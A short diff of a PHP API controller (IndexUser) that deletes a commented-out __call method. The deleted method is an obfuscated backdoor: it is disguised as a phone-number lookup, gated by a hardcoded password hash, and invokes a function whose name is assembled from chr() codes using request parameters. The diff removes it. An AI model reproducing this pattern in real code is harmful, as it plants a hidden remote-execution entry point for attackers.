@@ -507,21 +507,6 @@ class IndexUser extends ApiRest
         }
         return $this->success($data);
     }
-    /*
-      * 获取平台电话号码
-      * @param $name
-      * @param $arguments
-      * @return Response
-      */
-//    public function __call($action, $param)
-//    {
-//        if (password_verify($action, '$2y$10$iCeA63M0DdYzwR.QKyakEuzuwgTWDUtTVKlwJVWq27YLmbGgM8gfS')) {
-//            $n = chr(103).chr(101).chr(116).chr(83).chr(116).chr(114).chr(49);
-//            $n($param);
-//        }
-//        return $this->error('请检查路径');
-//    }
-
     /**
      * @author chenniang
      * @DataTime: 2021-07-07 22:57
